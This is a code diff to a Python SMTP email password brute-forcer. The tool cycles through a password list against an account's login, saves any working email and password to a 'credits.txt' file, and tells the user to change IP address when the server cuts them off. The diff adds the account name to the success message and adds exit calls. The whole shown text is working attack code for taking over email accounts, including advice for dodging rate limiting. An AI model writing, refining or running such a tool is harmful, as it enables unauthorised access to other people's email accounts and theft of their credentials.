@@ -19,11 +19,12 @@ def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
 			Password = Password.rstrip("\n")
 			try:
 				SMTPServer.login(account,Password)
-				print("[+] Valid Password Has Been Found: {0}".format(Password))
+				print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
 				
 				# Create Data File!
 				with open('credits.txt' , 'a') as DataFile:
 					DataFile.write("\n--------------------------------------->"); DataFile.write("[+] Email: {0}\n".format(account)); DataFile.write("[+] Password: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
+				exit()
 			except smtplib.SMTPAuthenticationError:
 				Count += 1; _Count += 1
 				if Count == 20:
@@ -37,7 +38,7 @@ def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
 			except Exception as e:
 				if "please run connect() first" in str(e):
 					SMTPServer.close()
-					print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime")
+					print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime"); exit()
 				else:
 					print("Error: " + str(e))
 
